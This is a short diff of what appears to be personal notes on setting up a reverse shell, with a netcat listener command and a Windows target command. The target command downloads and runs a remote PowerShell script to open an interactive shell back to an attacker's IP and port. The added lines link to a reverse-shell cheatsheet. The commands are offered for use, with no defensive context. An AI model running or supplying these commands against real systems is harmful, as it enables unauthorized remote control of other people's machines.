@@ -5,3 +5,6 @@ linux command = ssty raw -echo; (stty size; cat) | nc -lvnp port -s IPaddr
 
 targets command:
 windows target command = IEX(IWR https://raw.githubsercontent.com/antonioCoco/ConptyShell/master/invoke-ConptyShell.ps1 -useBasicParsing); Invoke-ConptyShell IP port
+
+for anyother help/ docmentiion go to:
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/7ab766446925ee11e3c8ddb188d7b1eb7cbea4e7/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell
